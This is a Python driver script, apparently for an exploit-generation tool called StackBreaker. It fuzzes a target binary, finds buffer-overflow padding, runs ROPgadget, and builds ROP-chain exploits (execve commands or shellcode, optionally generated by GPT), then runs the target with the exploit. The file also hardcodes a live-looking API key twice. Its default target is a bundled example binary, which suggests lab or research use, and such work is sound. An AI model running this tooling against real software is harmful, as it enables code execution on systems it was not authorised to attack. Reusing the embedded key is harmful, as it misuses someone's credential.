#!/usr/local/bin/python3

from GPTCompiler.Shell_coder import generate_shellcode_chain as gpt_shellcode_gen
from Shellcode_Chain_Generator import generate_shellcode_chain
from PaddingFinder.padding_finder import getPaddingLength
from Execve_Chain_Generator import generate_execve_chain
from GPTCompiler.test import main as compile_test
from Function_Extractor import extract_functions
from GPTCompiler.GPTCompiler import gpt_compile
from Fuzzer import fuzz as fuzzer

import os
import sys
import argparse
import subprocess
from pathlib import Path

parser = argparse.ArgumentParser(
    description="",
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
)
parser.add_argument("-p", "--program", default=Path("Examples/Vuln3/Vuln3-32/vuln3-32"))
parser.add_argument("--ROPgadget-path", default=Path("/usr/local/bin/ROPgadget"))
parser.add_argument("--out-rop-path", default=None)

parser.add_argument("--padding", default=False, type=bool)
parser.add_argument("--fuzz", default=False, type=bool)
parser.add_argument("--drawCFG", default=False, type=bool)
parser.add_argument("--drawCFG_simple", default=False, type=bool)
parser.add_argument("--printCFGPath", default=False, type=bool)
parser.add_argument("--printCallPath", default=False, type=bool)

parser.add_argument("--test", default=False, type=bool)
parser.add_argument("--end-to-end", default=False, type=bool)

parser.add_argument("--command", default=None, type=str)
parser.add_argument("--envp", default="", type=str)

parser.add_argument("--input", default=None, type=str)

parser.add_argument("--assembly", default=False, type=bool)

parser.add_argument("--api-key", default="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", type=str)

parser.add_argument("--gpt", default=False, type=bool)
parser.add_argument("--gpt-assembly", default=False, type=bool)

def clean():
    tempFiles = ['out-rop.txt', 'Evil', 'exploit', 'padding', 'gdbscript']

    for f in tempFiles:
        if os.path.isfile(f):
            os.remove(f)

def main(args):

    clean()

    if (args.program is None) or (not os.path.exists(args.program)):
        print("Invalid arguments. A path to a target program must be specified. "
              "E.g python StackBreaker.py --program=<PATH>")
        sys.exit()

    if args.fuzz:
        fuzzer.program = args.program
        fuzzer.findFuzzing()
        sys.exit(0)

    if args.drawCFG:
        fuzzer.program = args.program
        fuzzer.drawCFG()
        sys.exit(0)

    if args.drawCFG_simple:
        fuzzer.program = args.program
        fuzzer.drawCFG(complex=False)
        sys.exit(0)

    if args.printCFGPath:
        fuzzer.program = args.program
        fuzzer.printPath2Vuln()
        sys.exit(0)

    if args.printCallPath:
        fuzzer.program = args.program
        fuzzer.printCallPath()
        sys.exit(0)
        
    elif args.padding or args.end_to_end:
        print("Finding padding...")
        padding = getPaddingLength(args.program, verbose=True)[0]
        print("Padding found!\n\n" + str(padding))

    if (args.out_rop_path is None) or (not os.path.exists(args.out_rop_path)):
        if (args.ROPgadget_path is None) or (not os.path.exists(args.ROPgadget_path)):
            print("Invalid arguments. A path to ROPgadget or out-rop.txt must be specified. "
                  "E.g python StackBreaker.py --ROPgadget-path=<PATH> OR python StackBreaker.py --out-rop-path=<PATH>")
            sys.exit()

    # Call ROPGadget
    if args.out_rop_path is None:
        print("Executing ROPgadget...")
        command = str(args.ROPgadget_path) + " --binary " + str(args.program) + " --ropchain > out-rop.txt"
        try:
            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, universal_newlines=True)
            print("ROPgadget executed successfully!")
            print("Return code:", result.returncode)
            print("Output:\n", result.stdout)
        except subprocess.CalledProcessError as e:
            print("Error executing ROPgadget. Return code:", e.returncode)
            print("Error output:", e.output)
        args.out_rop_path = Path("out-rop.txt")

    # TODO: Error handling when ROPgadget fails
    # Extract functions
    print("Extracting functions and .data address from ROPgadget output...")
    data_address, _ = extract_functions(args.out_rop_path)
    print("Functions and .data address extracted!")

    if args.test:
        print("Starting testing...")
        succ, fail = compile_test(padding, args.out_rop_path)
        print("Testing completed!")
        print("Success Rate: " + str(succ))
        print("Failure Rate: " + str(fail))
        

    exploit_path = None

    if args.command is not None:
        print("Generating execve based exploit...")
        exploit_path = generate_execve_chain(padding, data_address, args.command, args.envp)
        print("Exploit generated!")
    elif args.assembly:
        print("Generating shellcode based exploit...")
        if args.input is None:
            print("Error: Missing input, provide a path to a file with python StackBreaker.py --input=<PATH>")
            sys.exit()
        exploit_path = generate_shellcode_chain(padding, args.out_rop_path, args.input)
        print("Exploit generated!")
    elif args.gpt:
        if args.input is None:
            print("Error: Missing input, provide a path to a file with python StackBreaker.py --input=<PATH>")
            sys.exit()
        with open(args.out_rop_path, 'r') as file:
            gadgets = file.read()
            exploit_path = gpt_compile(gadgets, args.input, "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", padding)
    elif args.gpt_assembly:
        if args.input is None:
            print("Error: Missing input, provide a path to a file with python StackBreaker.py --input=<PATH>")
            sys.exit()
        # with open(args.input, 'r') as input_file:
        #     shellcode = input_file.read()
        exploit_path = gpt_shellcode_gen(padding, args.out_rop_path, args.input)

    if args.end_to_end:
        if exploit_path is None:
            print("Error: No exploit available to run with the target program. "
                  "Either no exploit generation method was specified, or exploit generation failed.")
            sys.exit()

        # Run the program with the exploit
        print("Running program with exploit...")
        command = "./" + str(args.program) + " " + str(exploit_path)
        try:
            process = subprocess.Popen(command, shell=True, universal_newlines=True)
            process.wait()
            print("Program executed successfully.")
            print("Return code:", process.returncode)
            print("Output:\n", process.stdout)
        except subprocess.CalledProcessError as e:
            print("Error executing the program. Return code:", e.returncode)
            print("Error output:", e.output)
        args.out_rop_path = Path("out-rop.txt")


if __name__ == "__main__":
    main(parser.parse_args())
